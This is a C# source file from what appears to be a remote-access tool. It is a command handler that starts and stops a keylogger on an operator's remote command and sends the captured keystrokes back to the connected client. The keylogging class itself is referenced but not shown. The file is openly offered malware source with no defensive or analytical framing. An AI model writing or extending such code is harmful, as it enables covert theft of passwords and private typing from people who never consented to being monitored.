using System;
using System.Collections.Generic;
using System.Text;

namespace ServerDLL.CommandHandler.File
{
    class KeyLoggerRequestHandler : AbstractCommandHandler 
    {
        Keylogger kl;
        public override void HandleCommand(CommadMessage message)
        {
           string msg = GetRequestType(message.Message);

           switch (msg.ToLower())
           {
               case "startkeylog":
                   message.StreamWriter.WriteLine(StartKeyLogging());
                   AcknowledgeClient(message);
                   break;
               case "stopkeylog":
                   message.StreamWriter.WriteLine(StopKeyLogging());
                   AcknowledgeClient(message);
                   break;
               case "getkey":
                   message.StreamWriter.WriteLine (GetKeys());
                   kl.KeyBuffer = "";
                   AcknowledgeClient(message);
                   break;
               default:
                   nextCommandHandler.HandleCommand(message);
                   break;
           }


        }
        private string StartKeyLogging()
        {
            try
            {
                if (kl == null)
                {
                    kl = new Keylogger();
                    kl.Enabled = true; // enable key logging
                }
                return "Key Logging Started";
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }

        }
        private string StopKeyLogging()
        {
            try
            {
                if (kl != null)
                {
                    kl.Enabled = false;
                    kl = null;
                }
                return "Key Logging Stopped";
            }
            catch (Exception ex)
            {
                return ex.ToString();

            }

        }
        private string GetKeys()
        {
            try
            {
                if (kl != null)
                {
                    return kl.KeyBuffer;
                }

            }
            catch (Exception ex)
            {

                return ex.ToString();
            }
            return "No Statred ";
        }

    }
}
